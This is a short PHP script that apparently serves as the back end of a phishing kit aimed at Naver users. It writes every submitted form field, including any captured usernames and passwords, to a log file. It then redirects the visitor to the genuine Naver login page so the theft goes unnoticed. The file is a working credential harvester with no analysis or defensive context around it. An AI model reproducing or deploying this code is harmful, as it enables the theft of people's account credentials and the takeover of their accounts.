<?php

$file="log.txt";

file_put_contents($file, print_r($_POST, true), FILE_APPEND);

?>

<meta http-equiv= "refresh" content= "0; url=https://nid.naver.com/nidlogin.login?url=https%3A%2F%2Fsearch.naver.com%2Fsearch.naver%3Fsm%3Dtop_hty%26fbm%3D1%26ie%3Dutf8%26query%3D%25EB%2582%25B4%25EC%2595%2584%25EC%259D%25B4%25ED%2594%25BC%2B">
